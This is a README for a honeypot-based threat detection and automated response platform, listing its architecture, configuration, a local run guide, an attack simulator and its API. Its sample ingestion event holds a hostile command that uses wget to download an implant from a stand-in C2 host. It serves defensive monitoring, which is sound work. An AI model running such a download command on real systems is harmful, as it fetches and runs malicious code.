# SENTINEL SOC — Deception-Driven Threat Detection & Automated Response

**SENTINEL SOC** is an enterprise-grade deception detection and automated incident response engine. It ingests honeypot telemetry from four distinct honeypot types (`cowrie`, `opencanary`, `dionaea`, `conpot`), normalizes and deduplicates events, creates persistent per-IP attacker dossiers, maps attacks to the **MITRE ATT&CK** matrix and **Cyber Kill Chain**, computes explainable risk scores (0–100), detects anomalies with Isolation Forests, correlates attacker profiles through behavioral fingerprinting, and triggers automated firewall block enforcement with timed auto-rollback.

The platform includes:
- **Backend**: FastAPI + SQLAlchemy 2 (async SQLite/Postgres) + Pydantic v2 + WebSockets
- **Simulator**: Multi-scenario attack injector (`full_chain`, `brute_forcer`, `noise_scanner`, `repeat_attacker`, `coordinated`)
- **Frontend**: Operational SOC dashboard with 60fps Canvas 2D **Threat Universe** orbital radar

---

## Architecture Overview

```
c:\Projects\honey\
├── backend/
│   ├── app/
│   │   ├── main.py               # FastAPI entry point, lifespan, rollback worker, WS
│   │   ├── config.py             # Pydantic BaseSettings (.env configuration)
│   │   ├── db.py                 # Async SQLAlchemy engine & session factory
│   │   ├── models.py             # 10 Declarative ORM models (Event, Attacker, etc.)
│   │   ├── schemas.py            # Pydantic v2 validation contracts
│   │   ├── routers/              # 8 API routers
│   │   │   ├── events.py         # POST /api/events, GET /api/events
│   │   │   ├── attackers.py      # /api/attackers, /timeline, /replay, /block, /relationships
│   │   │   ├── incidents.py      # /api/incidents, notes, status transitions
│   │   │   ├── blocks.py         # /api/blocks active & history
│   │   │   ├── metrics.py        # /api/metrics (TTD, TTR, suppressed, distribution)
│   │   │   ├── health.py         # /api/honeypots/health, /api/overview
│   │   │   ├── simulate.py       # POST /api/simulate/start
│   │   │   └── ws.py             # WS /ws/live real-time socket stream
│   │   └── services/             # 21 Service modules
│   │       ├── ingest.py         # Master ingestion & pipeline orchestrator
│   │       ├── normalise.py      # Telemetry normalization & URL extraction
│   │       ├── dedup.py          # 60s sliding window alert deduplication
│   │       ├── fingerprint.py    # SHA256 behavioral fingerprinting & feature vectors
│   │       ├── classify.py       # Event-level classification engine
│   │       ├── mitre.py          # 10-Technique MITRE ATT&CK mapper
│   │       ├── killchain.py      # 6-Phase Cyber Kill Chain tracker
│   │       ├── intent.py         # Rule-based intent inference engine
│   │       ├── risk.py           # Additive explainable 0-100 risk scorer
│   │       ├── anomaly.py        # scikit-learn Isolation Forest anomaly detector
│   │       ├── correlate.py      # Cross-attacker Jaccard & campaign graph edges
│   │       ├── actions.py        # 4-Level automated response ladder
│   │       ├── enforcer.py       # Firewall block/unblock client with safe IP guard
│   │       ├── incidents.py      # TTD/TTR incident lifecycle manager
│   │       ├── metrics.py        # Metrics snapshot & analytics
│   │       ├── replay.py         # Terminal typing replay sequencer
│   │       ├── geo.py            # GeoIP resolver with offline mock fallback
│   │       ├── enrich.py         # AbuseIPDB & VirusTotal threat intelligence
│   │       ├── broadcast.py      # Native WebSocket broadcast dispatcher
│   │       ├── health.py         # Honeypot node health derivation
│   │       └── seed.py           # 8 Pre-populated demo attacker profiles
│   ├── tests/                    # 43 Comprehensive pytest unit & integration tests
│   ├── requirements.txt
│   └── pytest.ini
├── simulator/
│   └── simulate_attack.py        # Standalone attack simulator
├── frontend/                     # React + Vite + Tailwind CSS + Recharts + Canvas 2D
│   ├── src/
│   │   ├── components/
│   │   │   ├── Layout.jsx        # Persistent sidebar & live telemetry top bar
│   │   │   ├── ThreatUniverse.jsx# Canvas 2D signature orbital radar (60fps)
│   │   │   └── AttackerInvestigation.jsx # Slide-in dossier drawer (7 tabs)
│   │   └── pages/                # Overview, LiveEvents, Honeypots, Universe, etc.
└── README.md
```

---

## Environment Variables (`.env`)

Configure these fields in `.env` (or use the defaults for 100% offline local run):

| Variable | Default Value | Description |
|---|---|---|
| `API_KEY` | `changeme` | Authentication key required in `X-API-Key` header |
| `DATABASE_URL` | `sqlite+aiosqlite:///./sentinel.db` | Async database URL (SQLite or Postgres) |
| `MOCK_MODE` | `true` | When `true`, runs completely offline with zero API keys |
| `SEED_DEMO` | `true` | Seeds 8 realistic attacker profiles on startup |
| `SAFE_IPS` | `127.0.0.1,::1` | Whitelisted IPs that can **never** be blocked |
| `REQUIRE_APPROVAL` | `true` | Requires human sign-off for risk 76–89; auto-blocks >=90 |
| `ENFORCER_URL` | `""` | Base URL of firewall enforcer agent |
| `ENFORCER_TOKEN` | `""` | Bearer token for firewall enforcer |
| `HEALTH_URL` | `""` | External honeypot health proxy URL |
| `OPENAI_API_KEY` | `""` | Optional LLM integration key |
| `OPENAI_MODEL` | `gpt-4o-mini` | LLM model selector |
| `ABUSEIPDB_KEY` | `""` | AbuseIPDB threat intelligence API key |
| `VIRUSTOTAL_KEY` | `""` | VirusTotal malware analysis API key |
| `TELEGRAM_BOT_TOKEN` | `""` | Alerting webhook bot token |
| `TELEGRAM_CHAT_ID` | `""` | Alerting target chat ID |
| `PAGERDUTY_ROUTING_KEY`| `""` | PagerDuty incident routing key |
| `FRONTEND_ORIGIN` | `http://localhost:3000` | CORS allowed origin for Vite frontend |

---

## Quick Start (Run Locally)

### 1. Run Backend Server

```bash
cd backend
.venv\Scripts\uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
```
- API is live at: `http://localhost:8000`
- Interactive OpenAPI docs: `http://localhost:8000/docs`
- Live WebSocket stream: `ws://localhost:8000/ws/live`

### 2. Run Test Suite

```bash
cd backend
.venv\Scripts\pytest tests -v
```
*(43 tests covering risk calculation, alert deduplication, MITRE ATT&CK mapping, behavioral fingerprinting, relationship Jaccard correlation, and block auto-rollback)*

### 3. Run Attack Simulator

In a separate terminal:
```bash
# Run the complete APT kill chain scenario
backend\.venv\Scripts\python simulator/simulate_attack.py --scenario full_chain --speed 3.0

# Run all 5 attack scenarios
backend\.venv\Scripts\python simulator/simulate_attack.py --all --speed 5.0

# Run specific scenarios:
# python simulator/simulate_attack.py --scenario brute_forcer
# python simulator/simulate_attack.py --scenario noise_scanner
# python simulator/simulate_attack.py --scenario repeat_attacker
# python simulator/simulate_attack.py --scenario coordinated
```

### 4. Run Frontend Dashboard

```bash
cd frontend
npm run dev
```
- Open `http://localhost:3000` in your browser.

---

## Frozen API Contract Reference

All endpoints return JSON. Write endpoints require the `X-API-Key: changeme` header.

### Event Ingestion
- `POST /api/events` — Ingest single event or list of events.
```json
{
  "event_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
  "timestamp": "2026-10-31T18:00:00Z",
  "honeypot": "cowrie",
  "decoy_type": "external",
  "src_ip": "45.154.255.89",
  "src_port": 51234,
  "dst_port": 22,
  "session_id": "sess-01",
  "event_type": "command",
  "username": "root",
  "password": null,
  "command": "wget http://c2.apt.org/implant.bin",
  "url": "http://c2.apt.org/implant.bin",
  "file_hash": null,
  "raw": {}
}
```

### Core Endpoints
- `GET /api/overview` — KPI counts, active blocks, today's events, honeypots healthy
- `GET /api/events` — Paginated telemetry events with `severity`, `honeypot`, `q` filters
- `GET /api/attackers` — Attacker profile registry with risk scores, bands, geo
- `GET /api/attackers/{id}` — Full attacker investigation dossier (MITRE, kill chain, related)
- `GET /api/attackers/{id}/timeline` — Ordered chronological event sequence
- `GET /api/attackers/{id}/replay` — Interactive terminal typing replay with delta delays
- `POST /api/attackers/{id}/block` — Enforce temporary firewall block
- `POST /api/attackers/{id}/unblock` — Manual block rollback
- `GET /api/relationships` — Cross-attacker correlation edges (fingerprint, credentials, malware)
- `GET /api/incidents` — Incident queue with root cause and blast radius
- `PATCH /api/incidents/{id}` — Update incident status (`new` &rarr; `investigating` &rarr; `contained` &rarr; `resolved`)
- `POST /api/incidents/{id}/notes` — Append analyst investigation note
- `GET /api/blocks` — Firewall block enforcement history & verification timestamps
- `GET /api/metrics` — Average TTD/TTR, suppressed duplicates, 24h event distribution
- `GET /api/honeypots/health` — CPU, memory, event counts, and status for 4 honeypots
- `POST /api/simulate/start` — Triggers background attack simulation scenario
- `WS /ws/live` — Real-time event and state change stream

